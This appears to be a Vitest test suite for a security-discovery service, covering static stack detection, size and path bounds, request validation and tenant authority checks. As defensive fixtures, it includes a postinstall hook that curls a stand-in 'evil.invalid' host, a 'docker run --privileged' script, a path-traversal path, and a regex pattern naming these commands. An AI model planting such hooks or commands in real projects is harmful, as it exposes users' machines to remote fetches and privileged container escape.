import { readFileSync } from "node:fs";
import { join } from "node:path";
import { describe, expect, it, vi } from "vitest";

vi.mock("server-only", () => ({}));

import type { ProductContextAdapter } from "../../src/server/product/adapters/workspace";
import type { PrincipalMappingAdapter } from "../../src/server/product/principal/adapter";
import { SECURITY_CAPABILITIES } from "../../src/server/product/security/capabilities";
import {
  discoverSecurityStack,
  MAX_MANIFEST_BYTES,
  MAX_SINGLE_FILE_BYTES,
  MAX_SOURCE_FILES,
  MAX_TOTAL_DISCOVERY_BYTES,
} from "../../src/server/product/security/discovery";
import { createSecurityAssessmentPlan } from "../../src/server/product/security/planner";
import { parseDiscoveryIdRequest, parseSecurityDiscoveryRequest } from "../../src/server/product/security/request";
import { SecurityAssessmentService } from "../../src/server/product/security/service";
import type { SecuritySourceAdapter } from "../../src/server/product/security/source";
import { MemorySecurityDiscoveryStore } from "../../src/server/product/security/store";
import type {
  ProjectSourceFile,
  SecurityDiscoveryRequest,
  SecuritySourceResolveContext,
  TrustedSecuritySourceSnapshot,
} from "../../src/server/product/security/types";

const REVISION = "dae3b6bedb6f7d38481bc1de0d8bc61f0d7799e3";
const USER = "user-a";
const ORG = "org-a";
const WS = "ws-a";
const PRINCIPAL = "principal-a";

const session = {
  id: "sid",
  identity: { userRef: USER, subject: "sub-a" },
  workspace: { id: WS, organizationId: ORG, name: "Workspace" },
  version: 1,
  issuedAt: 1,
  expiresAt: Date.now() + 60_000,
  correlationId: "corr",
  csrfToken: "csrf",
  principalMapping: { state: "mapped-reference" as const, principalRef: PRINCIPAL, mappingVersion: 3 },
  oidcTokens: {},
};

function snapshot(files: ProjectSourceFile[], extra: Partial<TrustedSecuritySourceSnapshot> = {}): TrustedSecuritySourceSnapshot {
  return { projectId: "proj-a", sourceRevision: REVISION, files, ...extra };
}

class FakeContext implements ProductContextAdapter {
  constructor(private readonly member = true, private readonly organizationId = ORG) {}
  async resolveIdentity(_issuer: string, identity: never) { return identity; }
  async workspaceForUser(userRef: string, workspaceId: string) {
    if (!this.member || userRef !== USER || workspaceId !== WS) return undefined;
    return { id: WS, organizationId: this.organizationId, name: "Workspace" };
  }
}

class FakePrincipal implements PrincipalMappingAdapter {
  constructor(private readonly state: "mapped-reference" | "unmapped" | "unavailable" | "forbidden" = "mapped-reference") {}
  async resolve() {
    if (this.state === "mapped-reference") return { state: "mapped-reference" as const, principalRef: PRINCIPAL, mappingVersion: 3 };
    return { state: this.state } as const;
  }
}

class FakeSource implements SecuritySourceAdapter {
  readonly calls: SecuritySourceResolveContext[] = [];
  constructor(
    private readonly resolved: TrustedSecuritySourceSnapshot = snapshot([{ path: "package.json", content: JSON.stringify({ dependencies: { react: "19.3.0" } }) }]),
    private readonly failure?: string,
  ) {}
  async resolve(context: SecuritySourceResolveContext) {
    this.calls.push(context);
    if (this.failure) throw new Error(this.failure);
    return this.resolved;
  }
}

function service(options: {
  context?: ProductContextAdapter;
  principal?: PrincipalMappingAdapter;
  source?: SecuritySourceAdapter;
} = {}) {
  return new SecurityAssessmentService(
    options.context ?? new FakeContext(),
    options.principal ?? new FakePrincipal(),
    options.source ?? new FakeSource(),
    new MemorySecurityDiscoveryStore(),
  );
}

describe("BE8 R1 trusted static discovery bounds", () => {
  it("detects React/Next.js/JavaScript with provenance without executing package scripts", () => {
    const result = discoverSecurityStack(snapshot([{ path: "frontend/package.json", content: JSON.stringify({ scripts: { postinstall: "curl https://evil.invalid" }, dependencies: { next: "16.3.6", react: "19.3.0", pg: "8.23.0" } }) }]));
    expect(result.detected.map((tech) => tech.id)).toEqual(expect.arrayContaining(["javascript", "node", "nextjs", "react", "postgresql", "package-scripts-present"]));
    expect(result.safety).toEqual({ packageScriptsExecuted: false, networkUsed: false, dependencyInstallAttempted: false, arbitraryHostPathsAccepted: false });
  });

  it("detects .NET/C# from project metadata", () => {
    const result = discoverSecurityStack(snapshot([
      { path: "api/App.csproj", content: "<Project><PropertyGroup><TargetFramework>net9.0</TargetFramework></PropertyGroup></Project>" },
      { path: "api/Program.cs", content: "var builder = WebApplication.CreateBuilder(args);" },
    ]));
    expect(result.detected.map((tech) => tech.id)).toEqual(expect.arrayContaining(["dotnet", "csharp", "dotnet-target-framework"]));
  });

  it("detects mixed stacks", () => {
    const result = discoverSecurityStack(snapshot([
      { path: "package.json", content: JSON.stringify({ dependencies: { "@angular/core": "21.0.0" } }) },
      { path: "service/main.go", content: "package main" },
      { path: "infra/main.tf", content: "resource \"x\" \"y\" {}" },
      { path: ".gitlab-ci.yml", content: "stages: [test]" },
    ]));
    expect(result.detected.map((tech) => tech.id)).toEqual(expect.arrayContaining(["angular", "go", "terraform", "gitlab-ci"]));
  });

  it("keeps unknown stacks UNKNOWN", () => {
    const result = discoverSecurityStack(snapshot([{ path: "README.md", content: "notes only" }]));
    expect(result.unknown).toBe(true);
    expect(createSecurityAssessmentPlan(result).selectedCapabilities.find((item) => item.capabilityId === "SAST")?.state).toBe("UNKNOWN");
  });

  it("marks malicious paths unsupported", () => {
    expect(discoverSecurityStack(snapshot([{ path: "../secret/package.json", content: "{}" }])).unsupported[0]?.reason).toBe("MALICIOUS_PATH");
  });

  it("marks symlinks unsupported", () => {
    expect(discoverSecurityStack(snapshot([{ path: "linked/package.json", kind: "symlink", content: "{}" }])).unsupported[0]?.reason).toBe("SYMLINK_UNSUPPORTED");
  });

  it("marks malformed manifests unsupported", () => {
    expect(discoverSecurityStack(snapshot([{ path: "package.json", content: "{ bad" }])).unsupported[0]?.reason).toBe("MALFORMED_MANIFEST");
  });

  it("marks binary files unsupported", () => {
    expect(discoverSecurityStack(snapshot([{ path: "bin/blob.lock", binary: true }])).unsupported[0]?.reason).toBe("BINARY_UNPARSEABLE");
  });

  it("uses actual UTF-8 bytes even when metadata falsely claims sizeBytes=1", () => {
    const huge = "å".repeat(Math.floor(MAX_MANIFEST_BYTES / 2) + 10);
    const result = discoverSecurityStack(snapshot([{ path: "package.json", content: huge, sizeBytes: 1 }]));
    expect(result.unsupported[0]?.reason).toBe("OVERSIZED_MANIFEST");
  });

  it("rejects oversized non-manifest source bodies", () => {
    const result = discoverSecurityStack(snapshot([{ path: "src/huge.ts", content: "x".repeat(MAX_SINGLE_FILE_BYTES + 1), sizeBytes: 1 }]));
    expect(result.unsupported[0]?.reason).toBe("OVERSIZED_SOURCE_FILE");
  });

  it("fails closed when source file count exceeds the bound", () => {
    const files = Array.from({ length: MAX_SOURCE_FILES + 1 }, (_, index) => ({ path: `src/${index}.ts`, content: "" }));
    expect(() => discoverSecurityStack(snapshot(files))).toThrow("security_discovery_file_count_exceeded");
  });

  it("fails closed when total source bytes exceed the bound", () => {
    const half = "x".repeat(Math.floor(MAX_TOTAL_DISCOVERY_BYTES / 2) + 1);
    expect(() => discoverSecurityStack(snapshot([
      { path: "a.txt", content: half },
      { path: "b.txt", content: half },
    ]))).toThrow("security_discovery_total_bytes_exceeded");
  });

  it("generates deterministic discovery identifiers from trusted source revision and metadata", () => {
    const source = snapshot([{ path: "src/app.ts", content: "export {}" }]);
    expect(discoverSecurityStack(source).discoveryId).toBe(discoverSecurityStack(source).discoveryId);
  });
});

describe("BE8 R1 request authority", () => {
  it("requires CSRF/origin enforcement on security discovery and plan POST routes", () => {
    const startRoute = readFileSync(join(process.cwd(), "src/app/api/product/security/discovery/start/route.ts"), "utf8");
    const planRoute = readFileSync(join(process.cwd(), "src/app/api/product/security/plan/route.ts"), "utf8");
    expect(startRoute).toContain("assertCsrf(request, session)");
    expect(planRoute).toContain("assertCsrf(request, session)");
  });

  it("accepts only bounded project/target/intent request fields", () => {
    expect(parseSecurityDiscoveryRequest({ projectId: "proj-a", targetId: "target-a", assessmentIntent: "source" })).toEqual({ projectId: "proj-a", targetId: "target-a", assessmentIntent: "source" });
  });

  it("rejects caller-supplied arbitrary files", () => {
    expect(() => parseSecurityDiscoveryRequest({ projectId: "proj-a", files: [{ path: "package.json", content: "{}" }] })).toThrow("security_request_invalid");
  });

  it("rejects caller-supplied sourceRevision", () => {
    expect(() => parseSecurityDiscoveryRequest({ projectId: "proj-a", sourceRevision: REVISION })).toThrow("security_request_invalid");
  });

  it("rejects caller-supplied detectedStack", () => {
    expect(() => parseSecurityDiscoveryRequest({ projectId: "proj-a", detectedStack: ["nextjs"] })).toThrow("security_request_invalid");
  });

  it("rejects forged discovery content at the plan boundary", () => {
    expect(() => parseDiscoveryIdRequest({ discoveryId: "disc_0123456789abcdef01234567", detectedStack: ["nextjs"] })).toThrow("security_request_invalid");
  });

  it("accepts only a server discovery id as plan input", () => {
    expect(parseDiscoveryIdRequest({ discoveryId: "disc_0123456789abcdef01234567" })).toBe("disc_0123456789abcdef01234567");
  });
});

describe("BE8 R1 product/project/principal authority", () => {
  it("denies no-workspace sessions", async () => {
    await expect(service().discover({ ...session, workspace: undefined } as never, { projectId: "proj-a" })).rejects.toThrow("security_workspace_required");
  });

  it("denies sessions whose user is not a current workspace member", async () => {
    await expect(service({ context: new FakeContext(false) }).discover(session as never, { projectId: "proj-a" })).rejects.toThrow("security_forbidden");
  });

  it("denies organization mismatch even when workspace id exists", async () => {
    await expect(service({ context: new FakeContext(true, "org-other") }).discover(session as never, { projectId: "proj-a" })).rejects.toThrow("security_forbidden");
  });

  it("denies unmapped Principal authority", async () => {
    await expect(service().discover({ ...session, principalMapping: { state: "unmapped" } } as never, { projectId: "proj-a" })).rejects.toThrow("security_forbidden");
  });

  it("treats unavailable Principal mapping as backend unavailable", async () => {
    await expect(service().discover({ ...session, principalMapping: { state: "unavailable" } } as never, { projectId: "proj-a" })).rejects.toThrow("security_principal_unavailable");
  });

  it("denies forbidden Principal mapping", async () => {
    await expect(service().discover({ ...session, principalMapping: { state: "forbidden" } } as never, { projectId: "proj-a" })).rejects.toThrow("security_forbidden");
  });

  it("requires a fresh mapped-reference resolution matching the session mapping", async () => {
    await expect(service({ principal: new FakePrincipal("unmapped") }).discover(session as never, { projectId: "proj-a" })).rejects.toThrow("security_forbidden");
  });

  it("denies an unregistered project from the trusted source adapter", async () => {
    await expect(service({ source: new FakeSource(snapshot([]), "security_project_forbidden") }).discover(session as never, { projectId: "missing-project" })).rejects.toThrow("security_project_forbidden");
  });

  it("binds requested project to the trusted registered source result", async () => {
    await expect(service({ source: new FakeSource(snapshot([], { projectId: "proj-other" })) }).discover(session as never, { projectId: "proj-a" })).rejects.toThrow("security_project_forbidden");
  });

  it("binds requested target to the trusted registered source result", async () => {
    await expect(service({ source: new FakeSource(snapshot([], { targetId: "target-other" })) }).discover(session as never, { projectId: "proj-a", targetId: "target-a" })).rejects.toThrow("security_target_forbidden");
  });

  it("uses trusted source revision rather than any caller revision", async () => {
    const source = new FakeSource(snapshot([{ path: "README.md", content: "trusted" }], { sourceRevision: REVISION }));
    const result = await service({ source }).discover(session as never, { projectId: "proj-a" });
    expect(result.sourceRevision).toBe(REVISION);
    expect(source.calls[0]).toMatchObject({ productUserId: USER, organizationId: ORG, workspaceId: WS, principalRef: PRINCIPAL, projectId: "proj-a" });
  });

  it("scopes discovery identifiers to tenant/user authority so identical snapshots cannot overwrite across tenants", async () => {
    const store = new MemorySecurityDiscoveryStore();
    const source = new FakeSource();
    const first = new SecurityAssessmentService(new FakeContext(), new FakePrincipal(), source, store);
    const firstResult = await first.discover(session as never, { projectId: "proj-a" });

    const secondSession = {
      ...session,
      identity: { ...session.identity, userRef: "user-b" },
      workspace: { id: "ws-b", organizationId: "org-b", name: "Other Workspace" },
      principalMapping: { state: "mapped-reference" as const, principalRef: "principal-b", mappingVersion: 4 },
    };
    const secondContext: ProductContextAdapter = {
      async resolveIdentity(_issuer: string, identity: never) { return identity; },
      async workspaceForUser(userRef: string, workspaceId: string) {
        if (userRef !== "user-b" || workspaceId !== "ws-b") return undefined;
        return { id: "ws-b", organizationId: "org-b", name: "Other Workspace" };
      },
    };
    const secondPrincipal: PrincipalMappingAdapter = {
      async resolve() { return { state: "mapped-reference" as const, principalRef: "principal-b", mappingVersion: 4 }; },
    };
    const secondSource: SecuritySourceAdapter = {
      async resolve() { return snapshot([{ path: "package.json", content: JSON.stringify({ dependencies: { react: "19.3.0" } }) }]); },
    };
    const second = new SecurityAssessmentService(secondContext, secondPrincipal, secondSource, store);
    const secondResult = await second.discover(secondSession as never, { projectId: "proj-a" });

    expect(secondResult.discoveryId).not.toBe(firstResult.discoveryId);
    await expect(first.result(session as never, firstResult.discoveryId)).resolves.toMatchObject({ discoveryId: firstResult.discoveryId });
    await expect(second.result(secondSession as never, secondResult.discoveryId)).resolves.toMatchObject({ discoveryId: secondResult.discoveryId });
  });

  it("denies cross-workspace discovery result lookup", async () => {
    const s = service();
    const discovered = await s.discover(session as never, { projectId: "proj-a" });
    const other = { ...session, identity: { ...session.identity, userRef: "user-b" } };
    await expect(s.result(other as never, discovered.discoveryId)).rejects.toThrow();
  });

  it("denies cross-workspace/cross-user plan lookup", async () => {
    const s = service();
    const discovered = await s.discover(session as never, { projectId: "proj-a" });
    const other = { ...session, identity: { ...session.identity, userRef: "user-b" } };
    await expect(s.createPlan(other as never, discovered.discoveryId)).rejects.toThrow();
  });

  it("creates deterministic plans only from server-owned discoveries", async () => {
    const s = service();
    const discovered = await s.discover(session as never, { projectId: "proj-a" });
    const a = await s.createPlan(session as never, discovered.discoveryId);
    const b = await s.createPlan(session as never, discovered.discoveryId);
    expect(a.planId).toBe(b.planId);
    expect(a.provenance).toMatchObject({ discoveryId: discovered.discoveryId, sourceRevision: REVISION });
    expect(a.executionAuthority).toBe(false);
  });

  it("does not expose scanner command execution authority", async () => {
    const s = service({ source: new FakeSource(snapshot([{ path: "package.json", content: JSON.stringify({ scripts: { test: "docker run --privileged evil" }, dependencies: { react: "19.3.0" } }) }])) });
    const discovered = await s.discover(session as never, { projectId: "proj-a", assessmentIntent: "pipeline" } as SecurityDiscoveryRequest);
    const plan = await s.createPlan(session as never, discovered.discoveryId);
    expect(SECURITY_CAPABILITIES.every((capability) => capability.destructive === false)).toBe(true);
    expect(JSON.stringify(plan)).not.toMatch(/docker run|--privileged|shell_exec|run_scanner/i);
    expect(plan.executionAuthority).toBe(false);
    expect(discovered.safety).toMatchObject({ networkUsed: false, packageScriptsExecuted: false, dependencyInstallAttempted: false });
  });
});
